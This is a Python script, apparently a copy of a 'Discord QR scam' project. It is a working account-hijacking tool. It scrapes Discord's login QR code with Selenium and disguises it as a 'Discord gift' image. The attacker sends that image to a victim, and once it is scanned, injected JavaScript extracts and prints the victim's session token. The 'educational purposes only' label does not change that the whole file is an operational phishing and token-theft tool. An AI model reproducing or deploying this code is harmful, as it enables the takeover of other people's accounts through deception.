from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
from pathlib import Path
import base64
import time

# Developers: NightfallGT and MegaWatt_
# broken source: https://github.com/NightfallGT/Discord-QR-Scam
# Educational purposes only

class Colors:
    RED = "\033[91m"
    WHITE = '\033[0m'
    GREEN = '\033[92m'

path = Path(__file__).parent

def logo_qr():
    im1 = Image.open(path.joinpath("temp", "qr_code.png"), 'r')
    im2 = Image.open(path.joinpath("temp", "overlay.png"), 'r')
    im1.paste(im2, (60, 55), mask=im2)
    im1.save(path.joinpath("temp", "final_qr.png"), quality=95)

def final_form():
    im1 = Image.open(path.joinpath("temp", "template.png"), 'r')
    im2 = Image.open(path.joinpath("temp", "final_qr.png"), 'r')
    im1.paste(im2, (120, 409))
    im1.save(path.joinpath("temp", "discord_gift.png"), quality=95)
    im1.show()

def main():
    try:
        driver = webdriver.Firefox(executable_path="geckodriver")
    except Exception as e:
        try:
            e.stacktrace = None
        except AttributeError:
            ...
        print(Colors.RED + "ERROR: " + Colors.WHITE, end="")
        print(e)
        exit()

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-2R7t9S'}) # unstable, class can be changed by discord in future. if so, find it yourself at login page
    qr_code = div.find('img')['src']
    file = path.joinpath("temp", "qr_code.png")

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file, 'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    final_form()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting..')
    
    while True:
        try:
            if discord_login != driver.current_url:
                token = driver.execute_script(r"""let token = 
                (
                    webpackChunkdiscord_app.push(
                        [
                            [''],
                            {},
                            e => {
                                m = [];
                                for (let c in e.c)
                                    m.push(e.c[c])
                            }
                        ]
                    ),
                    m
                ).find(
                    m => m?.exports?.default?.getToken !== void 0
                ).exports.default.getToken()
                return token;""") # can be changed by discord in future
                print('-------------------------------------------')
                print('Token grabbed:', token)
                print('-------------------------------------------')
                driver.execute("close")
                break
        except Exception as e:
            try:
                e.stacktrace = None
            except AttributeError:
                pass
            print(Colors.RED + "ERROR: " + Colors.WHITE, end="")
            print(e)
            exit()
        time.sleep(0.1)

if __name__ == '__main__':
    main()
